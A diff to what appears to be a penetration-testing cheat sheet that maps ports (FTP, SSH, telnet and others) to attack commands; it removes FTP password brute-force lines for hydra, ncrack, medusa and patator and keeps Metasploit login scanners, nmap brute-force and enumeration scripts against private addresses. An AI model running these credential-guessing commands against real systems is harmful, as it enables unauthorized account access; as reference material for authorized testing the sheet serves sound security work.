@@ -10,11 +10,7 @@
 |15|tcp|netstat||
 |17|tcp|quote of the day||
 |19|tcp|character generator||
-|21|tcp|ftp|nmap --script ftp-anon `target`xhydra,hydra,ncrack,patator,metasploit,medusa
-hydra -L /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103 ftp
-                  ncrack –v -U /root/Desktop/user.txt -P /root/Desktop/pass.txt 192.168.1.103:21
-                  medusa -h 192.168.1.103 -U /root/Desktop/user.txt -P /root/Desktop/pass.txt -M ftp
-                  patator ftp_login host=192.168.1.103 user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
+|21|tcp|ftp|nmap --script ftp-anon `target`||
                   use auxiliary/scanner/ftp/ftp_login||
 |22|tcp|ssh|msf > use auxiliary/scanner/ssh/ssh_login<BR>nmap --script ssh2-enum-algos 192.168.108.197<BR>nmap --script ssh-hostkey 192.168.108.197<BR>nmap --script sshv1 192.168.108.197|
 |23|tcp|telnet|msf > use auxiliary/scanner/telnet/telnet_login<BR>nmap -p 23 --script telnet-brute --script-args userdb=myusers.lst,passdb=mypwds.lst,telnet-brute.timeout=8s `target`<BR>nmap -p 23 --script telnet-encryption `target`<BR>nmap -p 23 --script telnet-ntlm-info `target`|
